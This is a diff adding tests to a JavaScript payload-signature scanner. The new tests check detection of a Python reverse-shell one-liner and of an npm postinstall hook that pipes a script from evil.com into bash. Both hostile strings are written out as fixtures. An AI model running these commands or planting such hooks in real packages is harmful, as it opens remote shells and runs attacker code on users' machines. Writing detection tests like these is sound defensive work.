@@ -83,6 +83,18 @@ describe('Payload Signatures Detection', () => {
     assert.ok(threats.length >= 1);
     assert.strictEqual(threats[0].name, 'Discord Webhook Exfiltration Candidate');
   });
+
+  it('should detect Python one-liner reverse shells', () => {
+    const diff = `+ python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4242));'`;
+    const threats = scanPayloads(diff);
+    assert.ok(threats.some(t => t.name.includes('Reverse Shell')));
+  });
+
+  it('should detect malicious npm postinstall hooks', () => {
+    const diff = `+ "postinstall": "curl -s http://evil.com/setup.sh | bash"`;
+    const threats = scanPayloads(diff);
+    assert.ok(threats.length >= 1);
+  });
 });
 
 describe('Secret & Credential Checks', () => {
